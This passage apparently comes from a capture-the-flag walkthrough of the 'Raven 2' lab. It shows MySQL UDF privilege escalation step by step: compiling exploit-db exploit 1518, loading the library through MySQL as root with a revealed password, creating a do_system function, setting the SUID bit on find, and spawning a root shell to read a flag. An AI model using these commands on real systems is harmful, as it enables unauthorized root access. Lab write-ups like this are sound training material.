MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2) 

Let's download exploit from https://www.exploit-db.com/exploits/1518/. I renamed it to udf. And we will compile it at our machine: gcc -g -shared -Wl,-soname,udf.so -o udf.so udf.c -lc

Now start python -m SimpleHTTPServer 80 and download the file to the /var/www. Login to mysql mysql -u root --password=R@v3nSecurity We are going to use same steps as in Raven 1.

use mysql;
create table foo(line blob);
insert into foo values(load_file('/var/www/udf.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/udf.so';
create function do_system returns integer soname 'udf.so';
select do_system('chmod u+s /usr/bin/find');

Exit from mysql and continue typing

touch hacker
find hacker –exec "whoami" \;
find hacker –exec "/bin/sh" \;
cd /root
ls
cat flag4.txt
